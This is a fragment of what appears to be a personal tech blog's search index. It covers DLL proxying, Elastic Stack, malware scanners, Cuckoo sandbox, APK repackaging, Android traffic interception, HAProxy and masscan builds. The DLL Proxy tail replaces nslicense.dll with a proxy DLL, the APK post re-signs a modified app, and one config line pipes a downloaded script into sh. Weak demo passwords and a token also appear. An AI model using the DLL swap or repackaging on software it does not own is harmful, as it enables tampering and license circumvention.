\u0026#34;proxy.def\u0026#34;}\u0026#39; 123.txt strip -sv proxy.dll busybox mv -f nslicense.dll nslicense_old.dll busybox mv -f proxy.dll nslicense.dll Reference https://gcc.gnu.org/onlinedocs/gnat_ugn/Using-gnatdll.html https://sourceware.org/binutils/docs/ld/WIN32.html https://sourceware.org/binutils/docs/binutils/dlltool.html https://sourceware.org/binutils/docs/binutils/def-file-format.html https://docs.microsoft.com/zh-cn/cpp/build/reference/exports ","permalink":"https://xhstormr.github.io/blog/posts/dll-proxy/","summary":"","title":"DLL Proxy"},{"content":"Updated on 2020-08-08\nhttps://github.com/elastic/\nhttps://www.docker.elastic.co/\nDocker Compose docker-compose.yml version: \u0026#39;3\u0026#39; services: kibana: image: kibana:7.9.2 restart: always environment: I18N_LOCALE: zh-CN SERVER_BASEPATH: /kibana ELASTICSEARCH_USERNAME: elastic ELASTICSEARCH_PASSWORD: elastic healthcheck: test: curl -f http://127.0.0.1:5601/ || exit 1 labels: - traefik.http.services.kibana.loadbalancer.server.port=5601 - traefik.http.routers.kibana.rule=PathPrefix(`/kibana/`) - traefik.http.routers.kibana.middlewares=kibana-stripprefix - traefik.http.middlewares.kibana-stripprefix.stripprefix.prefixes=/kibana/ depends_on: - elasticsearch elasticsearch: image: elasticsearch:7.9.2 restart: always environment: ES_JAVA_OPTS: -Xms256m -Xmx256m ELASTIC_PASSWORD: elastic xpack.security.enabled: \u0026#39;true\u0026#39; discovery.type: single-node volumes: - elasticsearch_data:/usr/share/elasticsearch/data labels: - traefik.http.services.elasticsearch.loadbalancer.server.port=9200 - traefik.http.routers.elasticsearch.rule=PathPrefix(`/es/`) - traefik.http.routers.elasticsearch.middlewares=elasticsearch-stripprefix - traefik.http.middlewares.elasticsearch-stripprefix.stripprefix.prefixes=/es/ traefik: image: traefik:latest restart: always ports: - \u0026#39;8080:80\u0026#39; command: --api --providers.docker volumes: - /var/run/docker.sock:/var/run/docker.sock labels: - traefik.http.routers.traefik.service=api@internal - traefik.http.routers.traefik.rule=PathPrefix(`/traefik/`) || HeadersRegexp(`Referer`, `.*\\/traefik\\/.*`) - traefik.http.routers.traefik.middlewares=traefik-stripprefix,traefik-basicauth - traefik.http.middlewares.traefik-stripprefix.stripprefix.prefixes=/traefik/ - traefik.http.middlewares.traefik-basicauth.basicauth.removeheader=true - traefik.http.middlewares.traefik-basicauth.basicauth.users=${TRAEFIK_BASIC_AUTH} volumes: elasticsearch_data: .env TRAEFIK_BASIC_AUTH=123:$2y$05$80HqrqBOoNaabteix3gYJ.S0kT.HP6sw5GjOplRfGhGezth0yL78y Beats https://www.elastic.co/downloads/beats filebeat -e modules enable nginx filebeat -e setup filebeat -e Cluster version: \u0026#39;3\u0026#39; services: es01: image: elasticsearch:7.9.2 restart: always hostname: es01 environment: cluster.name: es-docker-cluster cluster.initial_master_nodes: es01,es02,es03,es04,es05,es06,es07,es08 discovery.seed_hosts: es02,es03,es04,es05,es06,es07,es08 bootstrap.memory_lock: \u0026#39;true\u0026#39; ES_JAVA_OPTS: -Xms32g -Xmx32g volumes: - es01_data:/usr/share/elasticsearch/data ulimits: memlock: soft: -1 hard: -1 ports: - 9200:9200 es02: image: elasticsearch:7.9.2 restart: always hostname: es02 environment: cluster.name: es-docker-cluster cluster.initial_master_nodes: es01,es02,es03,es04,es05,es06,es07,es08 discovery.seed_hosts: es01,es03,es04,es05,es06,es07,es08 bootstrap.memory_lock: \u0026#39;true\u0026#39; ES_JAVA_OPTS: -Xms32g -Xmx32g volumes: - es02_data:/usr/share/elasticsearch/data ulimits: memlock: soft: -1 hard: -1 es03: image: elasticsearch:7.9.2 restart: always hostname: es03 environment: cluster.name: es-docker-cluster cluster.initial_master_nodes: es01,es02,es03,es04,es05,es06,es07,es08 discovery.seed_hosts: es01,es02,es04,es05,es06,es07,es08 bootstrap.memory_lock: \u0026#39;true\u0026#39; ES_JAVA_OPTS: -Xms32g -Xmx32g volumes: - es03_data:/usr/share/elasticsearch/data ulimits: memlock: soft: -1 hard: -1 es04: image: elasticsearch:7.9.2 restart: always hostname: es04 environment: cluster.name: es-docker-cluster cluster.initial_master_nodes: es01,es02,es03,es04,es05,es06,es07,es08 discovery.seed_hosts: es01,es02,es03,es05,es06,es07,es08 bootstrap.memory_lock: \u0026#39;true\u0026#39; ES_JAVA_OPTS: -Xms32g -Xmx32g volumes: - es04_data:/usr/share/elasticsearch/data ulimits: memlock: soft: -1 hard: -1 es05: image: elasticsearch:7.9.2 restart: always hostname: es05 environment: cluster.name: es-docker-cluster cluster.initial_master_nodes: es01,es02,es03,es04,es05,es06,es07,es08 discovery.seed_hosts: es01,es02,es03,es04,es06,es07,es08 bootstrap.memory_lock: \u0026#39;true\u0026#39; ES_JAVA_OPTS: -Xms32g -Xmx32g volumes: - es05_data:/usr/share/elasticsearch/data ulimits: memlock: soft: -1 hard: -1 es06: image: elasticsearch:7.9.2 restart: always hostname: es06 environment: cluster.name: es-docker-cluster cluster.initial_master_nodes: es01,es02,es03,es04,es05,es06,es07,es08 discovery.seed_hosts: es01,es02,es03,es04,es05,es07,es08 bootstrap.memory_lock: \u0026#39;true\u0026#39; ES_JAVA_OPTS: -Xms32g -Xmx32g volumes: - es06_data:/usr/share/elasticsearch/data ulimits: memlock: soft: -1 hard: -1 es07: image: elasticsearch:7.9.2 restart: always hostname: es07 environment: cluster.name: es-docker-cluster cluster.initial_master_nodes: es01,es02,es03,es04,es05,es06,es07,es08 discovery.seed_hosts: es01,es02,es03,es04,es05,es06,es08 bootstrap.memory_lock: \u0026#39;true\u0026#39; ES_JAVA_OPTS: -Xms32g -Xmx32g volumes: - es07_data:/usr/share/elasticsearch/data ulimits: memlock: soft: -1 hard: -1 es08: image: elasticsearch:7.9.2 restart: always hostname: es08 environment: cluster.name: es-docker-cluster cluster.initial_master_nodes: es01,es02,es03,es04,es05,es06,es07,es08 discovery.seed_hosts: es01,es02,es03,es04,es05,es06,es07 bootstrap.memory_lock: \u0026#39;true\u0026#39; ES_JAVA_OPTS: -Xms32g -Xmx32g volumes: - es08_data:/usr/share/elasticsearch/data ulimits: memlock: soft: -1 hard: -1 kibana: image: kibana:7.9.2 restart: always environment: ELASTICSEARCH_HOSTS: http://es01:9200 ports: - 5601:5601 volumes: es01_data: es02_data: es03_data: es04_data: es05_data: es06_data: es07_data: es08_data: Reference https://www.elastic.co/guide/index.html kibana settings https://www.elastic.co/guide/cn/kibana/current/index.html elasticsearch rest-apis java-rest-high-query-builders java-rest-high-aggregation-builders https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html filebeat inputs modules ","permalink":"https://xhstormr.github.io/blog/posts/elk/","summary":"","title":"Elastic Stack"},{"content":"Updated on 2020-07-06\nYara https://yara.readthedocs.io/en/stable/ https://github.com/VirusTotal/yara wget https://github.com/VirusTotal/yara/archive/master.zip unzip master.zip cd yara-master/ ./build.sh yara --help ---- apt install yara ClamAV https://www.clamav.net/downloads apt install clamav clamav-daemon clamscan --help Loki https://github.com/Neo23x0/Loki wget https://github.com/Neo23x0/Loki/archive/master.zip unzip master.zip cd Loki-master/ python -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade pip python -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade -r requirements.txt python loki.py --help Reference https://github.com/InQuest/awesome-yara https://github.com/Yara-Rules/rules https://github.com/reversinglabs/reversinglabs-yara-rules https://github.com/ytisf/theZoo ","permalink":"https://xhstormr.github.io/blog/posts/malware-scanner/","summary":"","title":"Malware Scanner"},{"content":"Updated on 2020-05-03\nV2Ray https://github.com/v2fly/v2ray-core https://www.v2fly.org/guide/start.html { \u0026#34;inbound\u0026#34;: { \u0026#34;port\u0026#34;: 1080, \u0026#34;listen\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34; }, \u0026#34;outbound\u0026#34;: { \u0026#34;protocol\u0026#34;: \u0026#34;freedom\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;domainStrategy\u0026#34;: \u0026#34;UseIPv4\u0026#34; } }, \u0026#34;dns\u0026#34;: { \u0026#34;queryStrategy\u0026#34;: \u0026#34;UseIPv4\u0026#34;, \u0026#34;disableCache\u0026#34;: false, \u0026#34;servers\u0026#34;: [ \u0026#34;https://9.9.9.9/dns-query\u0026#34; ] } } Clash https://dreamacro.github.io/clash/ https://github.com/Dreamacro/clash/wiki/Configuration dns: enable: true default-nameserver: - 8.8.8.8 nameserver: - https://9.9.9.9/dns-query curl \u0026#39;https://www.google.com\u0026#39; -Ivx socks5h://127.0.0.1:1080 CoreDNS https://github.com/coredns/coredns https://coredns.io/plugins/ Corefile . { forward . tls://223.5.5.5 tls://223.6.6.6 { tls_servername dns.alidns.com } log errors cache } nslookup google.com 127.0.0.1 Reference https://www.alidns.com ","permalink":"https://xhstormr.github.io/blog/posts/coredns/","summary":"","title":"Proxy DNS"},{"content":"Updated on 2020-04-27\nhttps://github.com/cuckoosandbox/cuckoo\nhttps://cuckoo.sh/docs/installation/index.html\nBasic conda config --add channels conda-forge conda create -y -n myenv2 pycryptodome m2crypto python=2 conda activate myenv2 python -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade cuckoo M2CryptoWin64 cuckoo init cuckoo community cuckoo cuckoo submit --package exe --options arguments=\u0026#34;-Lvk http://www.qq.com\u0026#34; curl.exe Web cuckoo web runserver 0.0.0.0:1234 MongoDB mongod --dbpath D:\\Work\\mongo\\db --bind_ip_all mongo ---- use admin db.createUser({user: \u0026#34;root\u0026#34;, pwd: \u0026#34;123456\u0026#34;, roles: [{db: \u0026#34;admin\u0026#34;, role: \u0026#34;root\u0026#34;}]}) use cuckoo db.createUser({user: \u0026#34;123\u0026#34;, pwd: \u0026#34;123456\u0026#34;, roles: [{db: \u0026#34;cuckoo\u0026#34;, role: \u0026#34;dbOwner\u0026#34;}]}) db.getUsers() mongod --dbpath D:\\Work\\mongo\\db --bind_ip_all --auth API cuckoo api -H 0.0.0.0 -p 1337 python -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade flask curl -H \u0026#34;Authorization: Bearer giDMhiP63PZiCfnI0Oz3Yw\u0026#34; http://127.0.0.1:1337/tasks/list Misc mklink cuckoo cuckoo.exe tcpdump -D getmac /fo list /v Lib\\site-packages\\cuckoo\\auxiliary\\sniffer.py ---- err_whitelist_start ---- \u0026#34;tcpdump.exe: listening on \u0026#34;, resultserver 的 IP 为主机 HOST-ONLY 网卡的 IPv4 地址，推荐设置为 192.168.137.1。 Reference https://sec.xiaomi.com/article/45 https://blog.csdn.net/baobaoyu_/article/details/103047082 https://www.mongodb.com/download-center/community https://mirrors.huaweicloud.com/python/2.7.18/python-2.7.18.amd64.msi https://mirrors.tuna.tsinghua.edu.cn/virtualbox/virtualbox-Win-latest.exe https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-latest-Windows-x86_64.exe ","permalink":"https://xhstormr.github.io/blog/posts/cuckoo/","summary":"","title":"Cuckoo"},{"content":"Updated on 2020-04-24\n指令 MOV AL, 10H 指令 = 操作码 操作数 操作数 = 目的操作数(R/W), 源操作数(RO) 数据传送指令 通用传送指令 基本传送指令：MOV dst, src 栈指令：PUSH src、POP dst 以字为单位操作 交换指令：XCHG dst, src 以字或字节为单位操作 寄存器之间、寄存器和存储器之间 累加器传送指令 输入指令：IN 输出指令：OUT 地址传送指令 LEA：将源操作数的偏移地址传送到目的操作数 LDS：将源操作数的 4 个相继字节的数据分别发送给目的操作数和 DS 寄存器 LDS DI, [BX] DI \u0026lt;- DS + BX DS \u0026lt;- DS + BX + 2 LES 标志传送指令 LAHF AH \u0026lt;- PSW 的低 8 位 SAHF AH -\u0026gt; PSW 的低 8 位 PUSHF POPF 算术运算指令 加法指令 ADD：无进位加法指令 指令影响标志位 有符号运算超出范围，则 OF 为 1 无符号运算超出范围，则 CF 为 1 ADC：带进位加法指令 INC：自增 1 指令 减法指令 SUB：无进位减法指令 SBB：带进位减法指令 DEC：自减 1 指令 NEG：求补指令 转为补码（把操作数按位取反后末位加一） CMP：比较指令 不保留结果，只影响标志位 根据 Z 标志位，判断两数是否相等 根据 C 标志位，判断两个无符号数的大小 根据 S、O 标志位，判断两个有符号数的大小 乘法指令 MUL：无符号乘法 IMUL：有符号乘法 除法指令 DIV：无符号除法 IDIV：有符号除法 位运算指令 OR：或指令 NOT：非指令 AND：与指令 XOR：异或指令 TEST：测试指令 规则等同于与指令 不保留结果，只影响标志位 移位指令 SAL：算术左移 SAR：算术右移 最高位不变 SHL：逻辑左移 SHR：逻辑右移 ROL：无进位循环左移 左边移出的位补到右边，并送入 CF ROR：无进位循环右移 右边移出的位补到左边，并送入 CF RCL：带进位循环左移 原 CF 到右边，左边送入 CF RCR：带进位循环右移 原 CF 到左边，右边送入 CF 操作数存放位置 存放于指令中（立即数） MOV AL, 10H 中的 10H 存放于寄存器中（寄存器操作数） INC CX 中的 CX 存放于存储器中（存储器操作数） MOV AX, [2500H] 中的 [2500H] 寻址方式分类 地址寄存器 基址寄存器：BX、BP 变址寄存器：SI、DI 默认操作数存放于 DS 段寄存器：BX、SI、DI。 默认操作数存放于 SS 段寄存器：BP。 立即数寻址方式 MOV AL, 10H 寄存器寻址方式 INC CX 存储器寻址方式 直接寻址方式 MOV AX, [2500H] MOV AX, ES:[1064H]（段超越：操作数不在默认的 DS 段中） 寄存器间接寻址方式 操作数的偏移地址存放于寄存器当中。 MOV AX, [SI] MOV [BX], AL MOV AX, SS:[SI]（段超越：操作数不在默认段中） 寄存器相对寻址方式 寄存器间接寻址方式 + 指令中给定的偏移量。 MOV CL, [BX+1064H] 基址加变址寻址方式 段寄存器 + 基址寄存器 + 变址寄存器。 MOV AH, [BP][SI] [BP][SI] = SS + BP + SI = 40000H + 2000H + 1200H 相对基址加变址寻址方式 基址加变址寻址方式 + 指令中给定的偏移量。 MOV [BX+DI+1234H], AH [BX+DI+1234H] = DS + BX + DI + 1234H = 20000H + 0200H + 0010H + 1234H ","permalink":"https://xhstormr.github.io/blog/posts/assembly-lang/","summary":"","title":"Assembly language"},{"content":"Updated on 2020-04-22\nhttps://github.com/iBotPeaches/Apktool/releases/latest\njava -jar apktool_2.4.1.jar d QuanYingTong.apk java -jar apktool_2.4.1.jar b QuanYingTong cd QuanYingTong\\dist keytool -genkeypair -keystore release.jks -storepass 123456 -alias release -keyalg RSA -dname \u0026#34;cn=123\u0026#34; -validity 365 jarsigner -keystore release.jks -storepass 123456 -signedjar QuanYingTong_signed.apk QuanYingTong.apk release ","permalink":"https://xhstormr.github.io/blog/posts/apk-repack/","summary":"","title":"APK 重打包"},{"content":"Updated on 2020-03-15\nhttps://github.com/fish-shell/fish-shell\nhttps://fishshell.com/docs/current/commands.html\nhttps://fishshell.com/docs/current/language.html\nhttps://software.opensuse.org/package/fish\nBuild yum -y install gcc make cmake ncurses-devel curl -LO https://github.com/fish-shell/fish-shell/archive/master.zip unzip master.zip \u0026amp;\u0026amp; cd fish-shell-master mkdir build; cd build cmake .. make install config.fish export TERM=\u0026#39;screen-256color\u0026#39; export LANG=\u0026#39;zh_CN.UTF-8\u0026#39; export VISUAL=\u0026#39;idea -e\u0026#39; export HISTCONTROL=\u0026#39;ignoredups\u0026#39; set -g fish_prompt_pwd_dir_length 0 # https://patorjk.com/software/taag/#p=display\u0026amp;f=ANSI%20Shadow\u0026amp;t=leo set -g fish_greeting \u0026#39; ██╗ ███████╗ ██████╗ ██║ ██╔════╝██╔═══██╗ ██║ █████╗ ██║ ██║ ██║ ██╔══╝ ██║ ██║ ███████╗███████╗╚██████╔╝ ╚══════╝╚══════╝ ╚═════╝ _____ / \\ vvvvvvv/|____/| I /O,O | I /_____ | /|/| J|/^ ^ ^ \\ | /00 | _//| |^ ^ ^ ^ |W| |/^^\\ | /oo | \\m___m__|_| \\m_m_| \\mm_| \u0026#39; alias rm=\u0026#39;rm -i\u0026#39; alias cp=\u0026#39;cp -i\u0026#39; alias mv=\u0026#39;mv -i\u0026#39; alias df=\u0026#39;df -h\u0026#39; alias du=\u0026#39;du -h\u0026#39; alias less=\u0026#39;less -r\u0026#39; alias whence=\u0026#39;type -a\u0026#39; alias grep=\u0026#39;grep -n --color=auto\u0026#39; alias egrep=\u0026#39;egrep --color=auto\u0026#39; alias fgrep=\u0026#39;fgrep --color=auto\u0026#39; alias pgrep=\u0026#39;pgrep -a\u0026#39; # curl -o /usr/local/bin/fzf-tmux https://raw.githubusercontent.com/junegunn/fzf/master/bin/fzf-tmux \u0026amp;\u0026amp; chmod +x /usr/local/bin/fzf-tmux # curl -o ~/.config/fish/functions/fzf_key_bindings.fish https://raw.githubusercontent.com/junegunn/fzf/master/shell/key-bindings.fish export FZF_ALT_C_COMMAND=\u0026#39;fd -H -E .git -t d . $dir\u0026#39; export FZF_CTRL_T_COMMAND=\u0026#39;fd -H -E .git -t f . $dir\u0026#39; export FZF_DEFAULT_COMMAND=\u0026#39;fd -H -E .git\u0026#39; export FZF_ALT_C_OPTS=\u0026#39;--preview \u0026#34;ls -T {} | head -100\u0026#34; -0\u0026#39; export FZF_CTRL_T_OPTS=\u0026#39;--preview \u0026#34;bat -f {} | head -100\u0026#34; -0\u0026#39; export FZF_DEFAULT_OPTS=\u0026#39;-m -0\u0026#39; export FZF_TMUX=1 alias f=\u0026#39;fzf\u0026#39; # curl -Ls https://raw.githubusercontent.com/jarun/nnn/master/plugins/getplugs | sh # curl -o ~/.config/fish/functions/n.fish https://raw.githubusercontent.com/jarun/nnn/master/misc/quitcd/quitcd.fish export NNN_PLUG=\u0026#39;p:preview-tui;\u0026#39; export NNN_COLORS=\u0026#39;#0c\u0026#39; alias nnn=\u0026#39;nnn -adeUH -Pp\u0026#39; export EXA_COLORS=\u0026#39;da=2;0:gm=1;0\u0026#39; alias exa=\u0026#39;exa -aFg --group-directories-first --color=auto --time-style=long-iso --git --icons --color-scale --sort=Name\u0026#39; # alias ls=\u0026#39;ls -hFX --group-directories-first --color=auto --time-style=long-iso\u0026#39; alias ls=\u0026#39;exa\u0026#39; alias l=\u0026#39;ls -l\u0026#39; alias la=\u0026#39;l -a\u0026#39; alias ll=\u0026#39;l\u0026#39; alias vi=\u0026#39;vim\u0026#39; alias cat=\u0026#39;bat\u0026#39; alias ..=\u0026#39;c ..\u0026#39; alias ...=\u0026#39;c ../..\u0026#39; alias ....=\u0026#39;c ../../..\u0026#39; alias gs=\u0026#39;git status\u0026#39; alias gd=\u0026#39;git diff\u0026#39; alias now=\u0026#39;date +\u0026#34;%F %T\u0026#34;\u0026#39; alias myip=\u0026#39;curl -sk https://myip.ipip.net/\u0026#39; alias rand=\u0026#39;openssl rand -hex 30\u0026#39; alias aria2c=\u0026#39;aria2c -s16 -x16 -k1M\u0026#39; alias jq=\u0026#39;jq -C\u0026#39; alias e=\u0026#39;idea -e\u0026#39; alias o=\u0026#39;open\u0026#39; eval conda \u0026#34;shell.fish\u0026#34; \u0026#34;hook\u0026#34; $argv | source function start. # set -l path (cygpath -w (pwd)) # explorer $path # nautilus (pwd) open . end function c cd $argv[1] \u0026amp;\u0026amp; ll end function x set -l name (basename $argv[1] | string split -r -m1 .)[1] 7zz x $argv[1] -y -o$name end function h $argv[1] --help || $argv[1] -help || $argv[1] help end function v $argv[1] --version || $argv[1] -version || $argv[1] version end function take mkdir -p $argv cd $argv end function fkill set -l header (ps aux | head -1) set -l pid (ps aux | fzf -e --header \u0026#34;$header\u0026#34; | tr -s \u0026#39; \u0026#39; | cut -d \u0026#39; \u0026#39; -f 2) if test -n \u0026#34;$pid\u0026#34; kill -9 $pid end end function proxy_on set -xU all_proxy socks5://127.0.0.1:1080 set -xU http_proxy http://127.0.0.1:1080 set -xU https_proxy http://127.0.0.1:1080 set -xU GIT_SSH_COMMAND \u0026#39;ssh -o ProxyCommand=\u0026#34;socat - PROXY:127.0.0.1:%h:%p,proxyport=1080\u0026#34;\u0026#39; end function proxy_off set -e all_proxy set -e http_proxy set -e https_proxy set -e GIT_SSH_COMMAND end function fish_user_key_bindings fzf_key_bindings end function fish_prompt set -l last_pipestatus $pipestatus set -l normal (set_color normal) set -l status_color (set_color bryellow --bold) set -l suffix \u0026#39;❯\u0026#39; if fish_is_root_user set suffix \u0026#39;#\u0026#39; end set -l prompt_suffix (printf \u0026#39;%s\u0026#39; $status_color $suffix $normal) set -l status_color (set_color brblue) set -l statusb_color (set_color brblue --bold) set -l prompt_pwd (prompt_pwd | sed \u0026#34;s,/,$status_color/$status_color,g\u0026#34; | sed \u0026#34;s,\\(.*\\)/[^m]*m,\\1/$statusb_color,\u0026#34;) # set -l prompt_vcs (fish_vcs_prompt) # too slow if test -z \u0026#34;$prompt_vcs\u0026#34; set prompt_vcs $normal end set -l status_color (set_color $fish_color_status) set -l statusb_color (set_color $fish_color_status --bold) set -l prompt_status (__fish_print_pipestatus \u0026#34;[\u0026#34; \u0026#34;]\u0026#34; \u0026#34;|\u0026#34; \u0026#34;$status_color\u0026#34; \u0026#34;$statusb_color\u0026#34; $last_pipestatus) if test -z \u0026#34;$prompt_status\u0026#34; set prompt_status $normal end set -l prompt_left (printf \u0026#39;%s:%s %s%s\u0026#39; (prompt_login) $prompt_pwd $prompt_vcs $prompt_status) set -l prompt_time (date +\u0026#34;%T\u0026#34;) set -l prompt_duration (math $CMD_DURATION / 1000) set -l prompt_right (printf \u0026#39;(%.2fs) %s \u0026#39; $prompt_duration $prompt_time) set -l left_width (string_width $prompt_left) set -l right_width (string_width $prompt_right) set -l space_width (math $COLUMNS - $left_width - $right_width + 5) set -l prompt_space (printf \u0026#39;%\u0026#39;$space_width\u0026#39;s\u0026#39;) printf \u0026#39;%s%s%s\\n %s \u0026#39; \\ $prompt_left \\ $prompt_space \\ $prompt_right \\ $prompt_suffix end # https://github.com/fish-shell/fish-shell/issues/4012 function string_width set --local empty \u0026#39;\u0026#39; set --local raw_string (string replace --all --regex \u0026#39;\\e\\[[^m]*m\u0026#39; $empty -- $argv) string length -- $raw_string end function preexec --on-event fish_preexec end function postexec --on-event fish_postexec end fish_add_path -Pma /usr/bin # 移动至最后，降低优先级 fish_add_path (brew --prefix coreutils)/libexec/gnubin lua ~/z.lua --init fish once | source if type tmux \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 ; and not set -q TMUX tmux attach -c (pwd) || tmux new end \u0026#34;D:\\Work\\msys64\\msys2_shell.cmd\u0026#34; -no-start -full-path -mingw64 -shell fish ","permalink":"https://xhstormr.github.io/blog/posts/fish-shell/","summary":"","title":"Fish Shell"},{"content":"Updated on 2020-03-15\nhttps://www.lua.org/download.html\nStep pacman -Syu pacman -S --noconfirm --needed gcc make curl -O https://www.lua.org/ftp/lua-5.4.0.tar.gz tar zxf lua-5.4.0.tar.gz cd lua-5.4.0 make posix install CC=\u0026#39;x86_64-pc-msys-gcc\u0026#39; ","permalink":"https://xhstormr.github.io/blog/posts/msys2-build-lua/","summary":"","title":"构建 Lua"},{"content":"Updated on 2020-02-28\nCA 证书（根证书）需要安装（导入）为系统证书（不是用户证书），才能解密应用SSL流量。\nTun2socks https://github.com/eycorsican/go-tun2socks Reference https://github.com/ambrop72/badvpn/wiki/Tun2socks Postern https://github.com/postern-overwal/postern-stuff [Proxy] Proxy = https,192.168.1.4,8080 [Rule] FINAL,Proxy Shadowsocks https://github.com/shadowsocks/shadowsocks-android ss://YWVzLTI1Ni1nY206MTIzNDU2@192.168.1.4:1234 V2ray Config { \u0026#34;log\u0026#34;: { \u0026#34;loglevel\u0026#34;: \u0026#34;warning\u0026#34; }, \u0026#34;inbound\u0026#34;: { \u0026#34;port\u0026#34;: 1234, \u0026#34;listen\u0026#34;: \u0026#34;192.168.1.4\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;shadowsocks\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;method\u0026#34;: \u0026#34;aes-256-gcm\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34; } }, \u0026#34;outbound\u0026#34;: { \u0026#34;protocol\u0026#34;: \u0026#34;http\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;servers\u0026#34;: [ { \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: 8080 } ] } }, \u0026#34;outboundDetour\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;dns\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;freedom\u0026#34; } ], \u0026#34;routing\u0026#34;: { \u0026#34;settings\u0026#34;: { \u0026#34;rules\u0026#34;: [ { \u0026#34;outboundTag\u0026#34;: \u0026#34;dns\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;port\u0026#34;: \u0026#34;53\u0026#34; } ] } } } Clash https://github.com/Kr328/ClashForAndroid https://github.com/Dreamacro/clash/wiki/configuration proxies: - { name: burp, type: http, server: 192.168.1.100, port: 8080 } proxy-groups: - name: 手动 type: select proxies: - burp - DIRECT rules: - DOMAIN-SUFFIX,local,DIRECT - IP-CIDR,127.0.0.0/8,DIRECT,no-resolve - MATCH,手动 sing-box { \u0026#34;log\u0026#34;: { \u0026#34;level\u0026#34;: \u0026#34;info\u0026#34; }, \u0026#34;inbounds\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;tun\u0026#34;, \u0026#34;address\u0026#34;: [ \u0026#34;172.19.0.1/30\u0026#34; ], \u0026#34;auto_route\u0026#34;: true, \u0026#34;strict_route\u0026#34;: true } ], \u0026#34;outbounds\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;自选\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;selector\u0026#34;, \u0026#34;outbounds\u0026#34;: [ \u0026#34;burp\u0026#34;, \u0026#34;直连\u0026#34; ] }, { \u0026#34;tag\u0026#34;: \u0026#34;burp\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;http\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;192.168.100.2\u0026#34;, \u0026#34;server_port\u0026#34;: 8080 }, { \u0026#34;tag\u0026#34;: \u0026#34;直连\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;direct\u0026#34; } ], \u0026#34;dns\u0026#34;: { \u0026#34;strategy\u0026#34;: \u0026#34;ipv4_only\u0026#34;, \u0026#34;servers\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;https\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;9.9.9.9\u0026#34;, \u0026#34;detour\u0026#34;: \u0026#34;直连\u0026#34; } ] }, \u0026#34;route\u0026#34;: { \u0026#34;auto_detect_interface\u0026#34;: true, \u0026#34;default_domain_resolver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;rules\u0026#34;: [ { \u0026#34;action\u0026#34;: \u0026#34;sniff\u0026#34; }, { \u0026#34;protocol\u0026#34;: \u0026#34;dns\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;hijack-dns\u0026#34; }, { \u0026#34;ip_is_private\u0026#34;: true, \u0026#34;outbound\u0026#34;: \u0026#34;直连\u0026#34; }, { \u0026#34;clash_mode\u0026#34;: \u0026#34;Direct\u0026#34;, \u0026#34;outbound\u0026#34;: \u0026#34;直连\u0026#34; }, { \u0026#34;clash_mode\u0026#34;: \u0026#34;Global\u0026#34;, \u0026#34;outbound\u0026#34;: \u0026#34;自选\u0026#34; } ] } } Reqable https://github.com/reqable/reqable-app ","permalink":"https://xhstormr.github.io/blog/posts/android-proxy/","summary":"","title":"Android Proxy"},{"content":"Updated on 2020-02-21\nhttps://github.com/haproxy/haproxy\nMSYS2\nHAProxy\nStep D:\\Work\\Download\\haproxy-2.1.3\u0026gt; pacman -Syu pacman -S --noconfirm --needed gcc make make TARGET=cygwin USE_THREAD=1 CFLAGS=\u0026#39;-s -Os\u0026#39; LDFLAGS=\u0026#39;-static\u0026#39; strip -sv haproxy.exe 端口复用 global daemon defaults timeout connect 5000ms timeout client 50000ms timeout server 50000ms frontend main bind *:1025 use_backend ssh if { req.payload(0,3) -m bin 535348 } use_backend socks if { req.payload(0,3) -m bin 050100 050200 050300 } default_backend http backend http server default 127.0.0.1:80 backend ssh server default 127.0.0.1:22 backend socks server default 127.0.0.1:1080 端口转发 Linux Iptables: iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 1025 Windows Netsh: netsh interface portproxy show all netsh interface portproxy add v4tov4 listenport=80 connectport=1025 connectaddress=127.0.0.1 netsh interface portproxy delete v4tov4 listenport=80 Reference https://mirror.azure.cn/haproxy/2.1/doc/configuration.txt SOCKS5 RFC ","permalink":"https://xhstormr.github.io/blog/posts/msys2-build-haproxy/","summary":"","title":"构建 HAProxy"},{"content":"Updated on 2020-02-17\nmasscan\nStep docker pull ubuntu:rolling docker run -it --rm -v `pwd`:`pwd` -w `pwd` ubuntu:rolling sed -i \u0026#39;s/archive.ubuntu.com/mirrors.aliyun.com/g;s/security.ubuntu.com/mirrors.aliyun.com/g\u0026#39; /etc/apt/sources.list apt update \u0026amp;\u0026amp; apt -y install gcc-mingw-w64 make curl unzip curl -LO https://github.com/robertdavidgraham/masscan/archive/master.zip unzip master.zip \u0026amp;\u0026amp; cd masscan-master find -type f -exec sed -i \u0026#39;s/WinSock.h/winsock.h/g;s/WinSock2.h/winsock2.h/g;s/Windows.h/windows.h/g\u0026#39; {} + sed -i \u0026#39;s/-march=i686//g;s/CC = cc/CC = x86_64-w64-mingw32-gcc/g;s/lIPHLPAPI/liphlpapi/g;s/lWs2_32/lws2_32/g\u0026#39; Makefile make 